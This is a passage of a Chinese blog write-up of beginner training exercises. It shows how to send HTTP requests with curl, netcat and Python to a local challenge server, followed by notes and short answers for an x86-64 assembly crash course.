class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /?a=f4795b314fa022d21753a3ccdc037396&amp;b=19e098b0%20c1e3ffc6%260ea9c1d8%2353e69e00</span><br></pre></td></tr></tbody></table></figure></li><li><p>level18：利用<code>python</code>实现包含多个参数的http请求，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1/?a=1dc9ca4ec624516c5f17232cccf1290e&amp;b=deaaa58c%20ea168caa%26ba7e648d%23f1322933"</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level19：利用<code>curl</code>实现包含表单数据的http请求，使用<code>-d</code>参数可以指定<strong>POST</strong>请求的数据，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d "a=9a3879fa28637bf12b9eae87317f6f09" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li><li><p>level20：利用<code>nc</code>实现包含表单数据的http请求，wp如下：（<code>Content-Type</code>和<code>Content-Length</code>是必须存在的字段，否则报错）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 34\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=75236b164f727c132ec2d3c19b1db9da" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li></ul><p>这里<code>-e</code>告诉<code>echo</code>命令对特殊字符进行解释（例如<code>\r</code>,<code>\n</code>），<code>|</code>管道符将一个命令的输出传递给另一个命令的输入，<code>\r\n</code>的组合用于表示一个换行操作。<code>\r</code> 表示回车符，而<code>\n</code> 表示换行符。</p><blockquote><p>在早期的打字机和计算机系统中，回车和换行是两个不同的操作。回车是将打印头移动到行的开头，而换行是将纸张（或屏幕）上的滚动到下一行的开头。因此，回车和换行两者通常一起使用，以便在文本中创建新的行。</p><p>在ASCII和类似的字符编码标准中，回车符被编码为十进制值13，通常表示为<code>\r</code>。换行符被编码为十进制值10，通常表示为<code>\n</code>。</p><p>不同的操作系统采用了不同的惯例来表示换行。例如：</p><ul><li>在早期的Macintosh系统中，换行符为回车符。</li><li>在Unix和类Unix系统中，换行符为换行符（LF，Line Feed）。</li><li>在早期的微软DOS和Windows系统中，换行符由回车加换行（<strong>CRLF</strong>，CarriageReturn + Line Feed）组成。</li></ul></blockquote><ul><li><p>level21：利用<code>python</code>实现包含表单数据的http请求，wp如下：(使用<code>post</code>方法)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a758fc5442beded11613c025389e9e24"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level22：利用<code>curl</code>实现包含多个表单数据的http请求，wp如下：</p><p>同leve19</p></li><li><p>level23：利用<code>nc</code>实现包含多个表单数据的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e "POST / HTTP/1.1\r\nContent-Length: 78\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\na=02e05707979b92341471a4754f7237ae&amp;b=fddf3ce0%20c765b9f1%269d251f3c%23552a07ba" | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure></li><li><p>level24：利用<code>python</code>实现包含多个表单数据的http请求，wp如下：(注意这里可以不用对数据使用URL编码)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>,{<span class="string">"a"</span>:<span class="string">"a07ff34cf5dea70e6e31c83edb478217"</span>,<span class="string">"b"</span>:<span class="string">"6a5a088f 3218da24&amp;59d6fbf5#6ed02d14"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level25：利用<code>curl</code>实现包含json数据的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -d '{"a":"8638b985e542e67fb7b37160002dbe68"}' -H 'Content-Type:application/json' 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li><li><p>level26：利用<code>nc</code>实现包含json数据的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e 'POST / HTTP/1.1\r\nContent-Length: 40\r\nContent-Type: application/json\r\n\r\n{"a":"4d2c1a100629302982b1e18109ec7a71"}' | nc 127.0.0.1 80</span><br></pre></td></tr></tbody></table></figure><p>注意：<code>Content-Length</code>的数值是<code>{"a":"4d2c1a100629302982b1e18109ec7a71"}</code>中所有字符数</p></li><li><p>level27：利用<code>python</code>实现包含json数据的http请求</p><p>使用<code>requests</code>库的<code>post</code>方法：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.post(url, data={key: value}, json={key: value}, args)</span><br></pre></td></tr></tbody></table></figure><p>wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json={<span class="string">"a"</span>:<span class="string">"0f7e756c8025195bdcea9ad27f654aa5"</span>})</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level28：利用<code>curl</code>实现包含复杂json数据的http请求，wp如下：（注意json格式中数据不用转为URL编码）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -d <span class="string">'{"a":"c0bdab515fee54f5e283f6d3c463114e", "b":{"c":"34045ace","d":["c980a47e","49791158 3a2d4d50&amp;af0e06be#7775e47c"]}}'</span> -H <span class="string">'Content-Type: application/json'</span> 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>json格式的正确性可用https://www.json.cn/网站进行检查</p></blockquote></li><li><p>level29：利用<code>nc</code>实现包含复杂json数据的http请求，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">'POST / HTTP/1.1\r\nContent-Length: 122\r\nContent-Type: application/json\r\n\r\n{"a": "5b0edfe197f11902659671d4a8bbb45f","b": {"c": "d2452133", "d": ["213ad821","0d8a195a be586677&amp;df1106fc#cf339e36"]}}'</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>level30：利用<code>python</code>实现包含复杂json数据的http请求，wp如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">j = {</span><br><span class="line">    <span class="string">"a"</span>: <span class="string">"873f59825939afc43a5e88b01fa27462"</span>,</span><br><span class="line">    <span class="string">"b"</span>: {</span><br><span class="line">        <span class="string">"c"</span>: <span class="string">"5aa799e9"</span>,</span><br><span class="line">        <span class="string">"d"</span>: [</span><br><span class="line">            <span class="string">"60f6eca5"</span>,</span><br><span class="line">            <span class="string">"9d1c3fbe fc5003e0&amp;ec2fea1e#78755a76"</span></span><br><span class="line">         ]</span><br><span class="line">     }</span><br><span class="line">}</span><br><span class="line">flag = requests.post(<span class="string">"http://127.0.0.1"</span>, json = j)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level31：利用<code>curl</code>实现重定向的http请求，wp如下：</p><p>使用<code>-L</code>参数让 HTTP 请求跟随服务器的重定向</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -L 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></li><li><p>level32：利用<code>nc</code>实现重定向的http请求，wp如下：</p><p>首先直接使用nc连接目标主机，然后发送GET请求，返回重定向后的新地址，然后再次发送GET请求，此时包含新地址：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span></span><br><span class="line">GET /4dfeaa067729634146f8c739a0b7dbf8</span><br></pre></td></tr></tbody></table></figure></li><li><p>level33：利用<code>python</code>实现重定向的http请求，wp如下：（使用<code>allow_redirects</code>参数，<code>allow_redirects</code>默认是<code>True</code>,所以是默认跳转）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = requests.get(<span class="string">"http://127.0.0.1"</span>, allow_redirects=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>level34：利用<code>curl</code>实现包含cookie的http请求，wp如下：</p><p>首先通过<code>-I</code>获取http请求后<strong>服务器回应的http标头</strong>，查看服务器响应标头中的<code>Set-Cookie</code>字段，然后通过利用curl的<code>-b</code>参数实现cookie的设置：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -I 127.0.0.1</span><br><span class="line">curl -b "cookie=6c1ffe56054ed15c8f8bf71124c77835" 127.0.0.1</span><br></pre></td></tr></tbody></table></figure><blockquote><p><strong><code>Set-Cookie</code></strong> HTTP 响应标头用于将 cookie由服务器发送到用户代理，以便用户代理在后续的请求中可以将其发送回服务器</p></blockquote></li><li><p>level35：利用<code>nc</code>实现包含cookie的http请求，wp如下：</p><p>步骤类似于level34，首先获取服务器返回的<code>Set-Cookie</code>字段，wp如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80 (获取cookie)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>level36：利用<code>python</code>实现包含cookie的http请求，wp如下：</p><p>这题我直接使用<code>print(requests.get("http://127.0.0.1").text)</code>就获得了flag，应该是服务器出问题了？正确答案如下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://127.0.0.1'</span></span><br><span class="line">cookies = {<span class="string">'cookie_name'</span>: <span class="string">'cookie_value'</span>}</span><br><span class="line">response = requests.get(url, cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li><li><p>level37：利用<code>curl</code>实现有状态的http请求（session），wp如下：(使用<code>-i</code>和<code>-b</code>参数)</p><p>首先获取第一个状态：（一定要使用<code>-i</code>而不是<code>-I</code>，<code>-i</code>会多输出网页源码即包含flag）</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -i 127.0.0.1</span></span><br></pre></td></tr></tbody></table></figure><p>上面命令收到服务器回应后，<strong>先输出服务器回应的标头，然后空一行，再输出网页的源码</strong>。然后根据服务器返回的Cookie值进行下面的操作：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -b <span class="string">"session=eyJzdGF0ZSI6M30.Zh456A.oCLZ7Z63NHkFLh_USfmTWOANOIA"</span> -i 127.0.0.1 （重复该操作，注意修改sessionID）</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>知识点：cookie中可包含sessionID，发送给服务器</p></blockquote></li><li><p>level38：利用<code>nc</code>实现有状态的http请求（session），wp如下：</p><p>先获取第一个sessionID：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure><p>然后重复下面操作，注意每次修改sessionID：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">echo</span> -e <span class="string">"GET / HTTP/1.1\r\nCookie: cookie=112a3658ea797d72cd214d274183c9f0\r\n\r\n"</span> | nc 127.0.0.1 80</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>level39：利用<code>python</code>实现有状态的http请求（session），wp如下：</p><p>同level36，题目有问题</p></li></ul><h2 id="assembly-crush-course">Assembly Crush Course</h2><h3 id="知识点-1">知识点</h3><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181839763.png"></p><ul><li><p>寄存器：al、ah——8位，ax——16位，eax——32位，rax——64位</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404181827025.png"></p></li><li><p>汇编指令：</p><p>赋值：<code>mov rax, 0x538</code>，将 0x538 存到 rax 中</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov eax, -1</span><br><span class="line">movsx rax, eax   # movsx会进行符号扩展，保持原符号</span><br></pre></td></tr></tbody></table></figure></li><li><p>进程：虚拟内存空间</p><p>栈顶在低地址，栈底在高地址</p></li><li><p>内存地址：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x13337</span><br><span class="line">mov [rax], rbx       # 将rbx中的值赋给地址为0x13337的内存</span><br></pre></td></tr></tbody></table></figure></li><li><p>小端序</p></li><li><p><code>LEA</code>（Load EffectiveAddress）指令是x86汇编语言中的一种指令，用于将一个有效地址加载到一个寄存器中，例如</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lea rax, [rbx]     # 方括号内的内容会被解释为内存地址</span><br></pre></td></tr></tbody></table></figure></li><li><p><code>rsp</code>栈顶指针</p></li><li><p><code>rip</code>指向下一个指令，即下一个指令的地址</p></li><li><p>设置立即数的<strong>位数</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov DWORD PTR [rax], 0x1337     # 0x1337是32位（两个字-四个字节）</span><br></pre></td></tr></tbody></table></figure><blockquote><p>立即数 0x1337 存储到寄存器 rax所指向的内存地址中。这个指令的作用是将十六进制数 0x1337 写入到 rax寄存器所指向的内存地址中，存储的数据长度为 4 字节（DWORD）。</p></blockquote></li><li><p>有条件跳转</p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192154038.png"></p></li><li><p>标志寄存器：</p><ul><li><strong>零标志 ZF</strong>=1 表示结果为 0</li><li><strong>溢出标志 OF</strong>=1表示<strong>有符号</strong>整数运算溢出</li><li><strong>符号标志 SF</strong>表示<strong>有符号</strong>整数运算结果的符号</li><li><strong>进/借位标志 CF</strong>表示<strong>无符号</strong>整数运算的进/借位</li></ul></li><li><p><code>call</code> + 函数名</p></li><li><p>函数中的参数——被调用者：rdi、rsi、rdx、rcx、r8、r9等寄存器，<strong>返回值</strong>存放在rax中</p></li><li><p><strong>系统调用</strong>（SystemCall）：<code>syscall</code>会执行<code>rax</code>存放的数字对应的系统调用，rdi、rsi、rdx、r10、r8、r9用于存放系统调用的参数</p><p>例：<code>n = read(0, buf, 100);</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0 # the stdin file descriptor</span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rdx，100 # the number of bytes to read </span><br><span class="line">mov rax, 0 # system call number of read()</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure><p>例：<code>open()</code></p><p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/202404192217413.png"></p><p>例：<code>exit()</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 42 # our program's return code (e.g.. for bash scripts )</span><br><span class="line">mov rax, 60 # system call number of exit( )</span><br><span class="line">syscall # do the system call</span><br></pre></td></tr></tbody></table></figure></li><li><p>在汇编代码前加上<code>. intel_syntax noprefix</code>表示Intel汇编语法</p></li><li><p>汇编程序：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 42</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></tbody></table></figure><p>汇编程序-&gt;可执行文件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">gcc -nostdlib -o quitter quitter.s</span></span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li><p><code>-nostdlib</code>：告诉编译器不使用标准库。标准库包含了C语言中常用的函数和宏定义，但在一些特殊的情况下，比如在编写汇编程序时，我们可能不希望链接标准库。</p></li><li><p><code>-o quitter</code>：指定输出文件的名称为<code>quitter</code>，这个名称可以根据你的需要进行更改。</p></li></ul></blockquote></li><li><p><code>objdump</code>命令（shell）：对目标文件(obj)或可执行文件进行反汇编</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -M intel -d quitter</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>大写的 <code>-M</code> 选项，如<code>-M intel</code>，用于指定<strong>指令集的风格</strong>而不是机器架构</p><p>小写的<code>-m</code> 选项用于指定机器架构</p><p><code>-d</code>：从objfile中对机器指令进行反汇编。本选项只对那些包含指令的section进行反汇编</p></blockquote></li><li><p><code>objcopy</code>：将一个目标文件的内容拷贝到另外一个目标文件当中</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ objcopy --dump-section .text=quitter_binary_code quitter</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li><code>--dump-section .text=quitter_binary_code</code>：指定将<code>.text</code> 节的内容提取出来，并将其保存到名为<code>quitter_binary_code</code> 的文件中。<code>.text</code>节通常包含程序的机器码指令。</li><li><code>quitter</code>：指定要处理的输入文件，即要从中提取内容的可执行文件。</li></ul></blockquote></li></ul><h3 id="练习-1">练习</h3><ul><li><p>level1：<code>mov</code>，给寄存器赋值</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, 0x1337</span><br></pre></td></tr></tbody></table></figure></li><li><p>level2：无</p></li><li><p>level3：<code>add</code>加法</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add rdi, 0x331337</span><br></pre></td></tr></tbody></table></figure></li><li><p>level4：<code>imul</code>乘法，计算f(x) = mx +b，结果存在rax中，其中 m = rdi，x = rsi，b = rdx</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  imul rdi, rsi</span><br><span class="line">  add rdi, rdx</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure></li><li><p>level5：<code>div</code>除法，只有一个操作数，可以进行128位被除数除以64位除数，并且存储商和余数，其中商存储在<code>rax</code>中，余数存储在<code>rdx</code>中，步骤如下：</p><p>rax = rdx:rax / reg rdx = remainder</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi #rax为低64位</span><br><span class="line">div rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level6：取余，将余数存入<code>rax</code>中</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, rdi</span><br><span class="line">div rsi</span><br><span class="line">mov rax, rdx</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level8：rax = rdi % 256，rbx = rsi % 65536，只使用<code>mov</code>指令（模运算mod，取低位）</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al, dil  # 低8位</span><br><span class="line">mov bx, si   # 低16位</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level9：使用左移<code>shl</code>，右移<code>shr</code>，为rax赋值</p><p>rdi = | B7 | B6 | B5 | B4 | B3 | B2 | B1 | B0 |</p><p>目标：rax = B4</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shl rdi, 24  # 左移24位，得到 B4B3B2B1B0000000</span><br><span class="line">shr rdi, 56  # 右移56位，得到 00000000000000B4，即B4</span><br><span class="line">mov rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level10：按位与<code>and</code></p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and rdi, rsi</span><br><span class="line">and rax, rdi</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level11：or、and、xor。若x（rdi）为偶数，则y（rax）为1，否则为0</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and rax, 0  #先将y置为0</span><br><span class="line">or rax, 0x1 #将y的最低位 置为1</span><br><span class="line">and rdi, 0x1 #保留x的最低位</span><br><span class="line">xor rax, rdi #异或，若x最低位为0，则y为1，否则为0</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level14：内存读写。将指定内存中的数据存放到 rax中，在将内存中的数据进行加法操作</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [0x404000]  #先将数据存入rax中</span><br><span class="line">add rax, 0x1337      #对rax进行加法（不能对内存进行加法操作）</span><br><span class="line">mov [0x404000], rax  #写回内存</span><br><span class="line">sub rax, 0x1337      #复原rax中的数据</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level16：获取不同位数的内存数据</p><blockquote><pre><code>Quad Word   = 8 bytes = 64 bitsDouble Word = 4 bytes = 32 bitsWord        = 2 bytes = 16 bitsByte        = 1 byte  = 8 bits</code></pre></blockquote><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov al, [0x404000]</span><br><span class="line">mov bx, [0x404000]</span><br><span class="line">mov ecx, [0x404000]</span><br><span class="line">mov rdx, [0x404000]</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level17：为 [rdi] 和 [rsi]内存赋值。（不能直接对内存数据进行立即数的相关操作）</p><p>利用寄存器作为中转，先将数据存入寄存器，然后将寄存器中的数据存入内存</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0xdeadbeef00001337</span><br><span class="line">mov [rdi], rax</span><br><span class="line"></span><br><span class="line">mov rax, 0xc0ffee0000</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level18：通过偏移量访问目标内存的数据，并将数据存入对应的内存</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rdi]</span><br><span class="line">add rax, [rdi+8]</span><br><span class="line">mov [rsi], rax</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>leve19：stack（栈）。获取栈顶数据作为被减数，减法过后将数据存入栈中</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rax #获取栈顶元素</span><br><span class="line">sub rax, rdi</span><br><span class="line">push rax #推入栈中</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level20：利用栈交换两个寄存器（rdi、rsi）存放的值</p><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push rdi</span><br><span class="line">push rsi</span><br><span class="line">pop rdi</span><br><span class="line">pop rsi</span><br></pre></td></tr></tbody></table></figure><p></p></li><li><p>level21：通过栈顶指针 rsp 访问内存数据</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov rax, [rsp]</span><br><span class="line">add rax, [rsp+8]</span><br><span class="line">add rax, [rsp+16]</span><br><span class="line">add rax, [rsp+24] #将四个数据相加</span><br><span class="line">mov rsi, 4</span><br><span class="line">div rsi #获取四个数的平均值，存放在rax中</span><br><span class="line">push rax</span><br></pre></td></tr></tbody></table></figure></li><li><p><strong>level24</strong>：无条件转移，利用 jmp 跳转到距离当前位置0x51 个字节的位置，同时在新位置处存放特定代码。</p><blockquote><ul><li><p><code>nop</code><strong>指令</strong>（1Byte）：空操作，对程序逻辑没有任何作用，出于这个原因，它被用来填充代码。</p></li><li><p><code>.rept</code><strong>指令</strong>：循环执行指定的操作</p><p>注意：下面的这些伪指令只是告诉汇编器要生成多少个 <code>nop</code>指令，它们本身并不会出现在最终的机器码中。生成的机器码中只包含真正的指令（如<code>jmp</code>、<code>nop</code>、<code>pop rdi</code>、<code>mov rax, 0x403000</code>、<code>jmp rax</code>），这些指令会按照需要的字节数存储在内存中。最终的机器码中不会包含<code>.rept</code>、<code>.endr</code> 或 <code>nop</code> 的 ASCII表示形式。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rept times</span><br><span class="line">    code</span><br><span class="line">.endr</span><br></pre></td></tr></tbody></table></figure></li></ul></blockquote><p></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 